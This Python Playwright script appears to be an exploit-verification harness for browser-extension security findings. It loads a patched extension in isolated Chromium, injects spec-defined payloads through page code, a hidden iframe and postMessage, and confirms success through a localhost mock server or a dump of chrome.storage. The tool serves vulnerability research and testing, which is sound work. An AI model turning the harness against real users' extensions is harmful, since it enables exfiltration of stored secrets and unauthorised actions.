#!/usr/bin/env python3
"""Load ONE patched extension alone in an isolated Chromium, fire an attacker payload from a
test page, and verify the exploit by reading the real outcome (mock server / page value /
the extension's own chrome.storage). Spec-driven so it covers every finding category.

Usage:
    python verify.py <ext_dir> <spec.json> [--server-log PATH] [--headed|--headless]

Spec JSON fields (all optional unless noted):
    category   REQUIRED: "request" | "iframe" | "twoway" | "exfil" | "storage"
    id         extension id to address in payloads. Default: the pinned id
               (nekdljaflldlhkhnmiflclddiepbehnf). For an extension that kept its OWN key,
               pass its real id (patch_manifest.py prints it).
    start_url  page to run on. Default "https://example.com".
    marker     value to look for. Auto-generated if omitted. Available in JS as {MARK}.
               In JS you also have {SRV} (mock URL incl. ?src={MARK}) and {ID}.

  request  : trigger   -> JS that fires the payload (usually a postMessage). PASS if the mock
                          server logs a hit containing {MARK}. Put {SRV} in the payload URL.
  iframe   : iframe_page    -> extension page to embed (e.g. "frame.html")
             iframe_message -> JS object literal posted to the iframe; use MARKURL for the url.
                          PASS if the server logs {MARK}.
  twoway   : capture   -> async JS returning a value. PASS if `expect` is a substring of it.
  exfil    : capture   -> async JS returning the value handed back to the page.
             seed              -> [{area,key,value}] written to chrome.storage via the SW
                                  BEFORE capture (to plant a secret the get should return).
             seed_localstorage -> {key:value} set in page localStorage before capture.
             prime             -> JS run once before seeding (e.g. a dummy sendMessage to
                                  wake a lazy SW so it can be seeded).
             expect            -> substring required in the returned value.
  storage  : trigger   -> JS that fires the write. PASS if {MARK} appears in chrome.storage.
             fires     -> how many times to dispatch (default 8; loaders attach late).
             read_page -> extension html page to open for reading storage when there is NO
                          service worker (e.g. "index.html" / "options/options.html").

Notes / gotchas baked in elsewhere (see SKILL.md): MV2 extensions do NOT load in current
Chromium; message sub-types are exact; some handlers coerce input (e.g. parseInt) so a marker
must match the expected type; content scripts inject only after the page loads with the ext
enabled (handled here since we load the ext, then navigate).
"""
import sys, os, json, time, tempfile, random, argparse
from playwright.sync_api import sync_playwright

PINNED = "nekdljaflldlhkhnmiflclddiepbehnf"
SRV = "http://127.0.0.1:3000/api/data"
READ_ALL = ("(async()=>{const o={};for(const a of['local','sync','session']){"
            "try{o[a]=await chrome.storage[a].get(null);}catch(e){o[a]='e';}}return JSON.stringify(o);})()")


def sub(js, mark, eid):
    return (js.replace("{SRV}", f"{SRV}?src={mark}").replace("{MARK}", mark).replace("{ID}", eid))


def wait_sw(ctx, t=8):
    """Return an extension execution context that has chrome.storage: the MV3 service worker,
    or (for MV2) the background page. Polls until one appears."""
    s = time.time()
    while time.time() - s < t:
        if ctx.service_workers:
            return ctx.service_workers[0]
        if ctx.background_pages:
            return ctx.background_pages[0]
        time.sleep(0.3)
    return None


def run(ext_dir, spec, server_log, headed, executable=None):
    cat = spec["category"]
    eid = spec.get("id") or PINNED
    mark = spec.get("marker") or ("EXPLOIT_" + str(random.randint(10000, 99999)))
    start_url = spec.get("start_url", "https://example.com")
    udd = tempfile.mkdtemp(prefix="verify_")
    result = {"category": cat, "id": eid, "marker": mark}
    p = sync_playwright().start()
    launch_kwargs = dict(
        headless=(not headed),
        args=[f"--disable-extensions-except={ext_dir}", f"--load-extension={ext_dir}",
              "--no-first-run", "--no-default-browser-check",
              "--disable-features=DisableLoadExtensionCommandLineSwitch"])
    if executable:  # e.g. an older Chrome-for-Testing that still loads Manifest V2
        launch_kwargs["executable_path"] = executable
    ctx = p.chromium.launch_persistent_context(udd, **launch_kwargs)

    def logtext():
        try:
            return open(server_log, encoding="utf-8", errors="replace").read()
        except Exception:
            return ""

    try:
        page = ctx.new_page()
        page.goto(start_url, wait_until="domcontentloaded")
        time.sleep(3.0)

        if cat == "request":
            page.evaluate(sub(spec["trigger"], mark, eid)); time.sleep(3.5)
            ok = mark in logtext()
            result.update(passed=ok, evidence=("server logged " + mark) if ok else "no server hit")

        elif cat == "iframe":
            markurl = f'"{SRV}?src={mark}"'
            msg = spec["iframe_message"].replace("MARKURL", markurl)
            js = (f"(async()=>{{const frm=document.createElement('iframe');frm.style.display='none';"
                  f"frm.src='chrome-extension://{eid}/{spec['iframe_page']}';document.body.appendChild(frm);"
                  f"await new Promise(r=>{{frm.onload=r;setTimeout(r,3000);}});"
                  f"try{{frm.contentWindow.postMessage({msg},'*');}}catch(e){{return 'post-err:'+e.message;}}return 'posted';}})()")
            page.evaluate(js); time.sleep(3.5)
            ok = mark in logtext()
            result.update(passed=ok, evidence=("server logged " + mark) if ok else "no server hit")

        elif cat in ("twoway", "exfil"):
            if spec.get("prime"):
                page.evaluate(sub(spec["prime"], mark, eid))
            if spec.get("seed"):
                sw = wait_sw(ctx, 8)
                if not sw:
                    result.update(passed=False, evidence="no service worker to seed"); raise SystemExit
                for s in spec["seed"]:
                    sw.evaluate("new Promise(r=>chrome.storage.%s.set(%s,r))"
                                % (s["area"], json.dumps({s["key"]: s["value"]})))
            if spec.get("seed_localstorage"):
                for k, v in spec["seed_localstorage"].items():
                    page.evaluate("localStorage.setItem(%s,%s)" % (json.dumps(k), json.dumps(v)))
            res = page.evaluate(sub(spec["capture"], mark, eid))
            exp = spec.get("expect", "")
            ok = (exp in str(res)) if exp else (str(res) not in ("__timeout__", "None", "null", None))
            result.update(passed=ok, evidence="returned to page: " + str(res)[:160])

        elif cat == "storage":
            fires = int(spec.get("fires", 8))
            dump = ""
            for _ in range(fires):
                page.evaluate(sub(spec["trigger"], mark, eid)); time.sleep(0.8)
                sw = ctx.service_workers[0] if ctx.service_workers else None
                if not sw:
                    sw = ctx.background_pages[0] if ctx.background_pages else None
                if sw:
                    try: dump = sw.evaluate(READ_ALL)
                    except Exception: dump = ""
                    if mark in str(dump): break
            if mark not in str(dump) and spec.get("read_page"):
                rp = ctx.new_page(); rp.goto(f"chrome-extension://{eid}/{spec['read_page']}", wait_until="load")
                time.sleep(1); dump = rp.evaluate(READ_ALL)
            ok = mark in str(dump)
            result.update(passed=ok, evidence=("marker in chrome.storage" if ok else "not found; dump=" + str(dump)[:200]))
        else:
            result.update(passed=False, evidence="unknown category")
    except SystemExit:
        pass
    except Exception as e:
        result.update(passed=False, evidence="EXC: " + str(e)[:200])
    finally:
        ctx.close(); p.stop()
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("ext_dir"); ap.add_argument("spec")
    ap.add_argument("--server-log", default="_verify_server.log")
    ap.add_argument("--executable", default=None,
                    help="path to a Chrome/Chromium binary; use an older Chrome-for-Testing "
                         "(<=126) for Manifest V2 extensions, which current Chromium won't load")
    ap.add_argument("--headed", dest="headed", action="store_true", default=True)
    ap.add_argument("--headless", dest="headed", action="store_false")
    a = ap.parse_args()
    spec = json.load(open(a.spec, encoding="utf-8"))
    r = run(a.ext_dir, spec, a.server_log, a.headed, a.executable)
    print(("PASS" if r.get("passed") else "FAIL"), "|", r["category"], "|", r.get("evidence"))
    print(json.dumps(r))
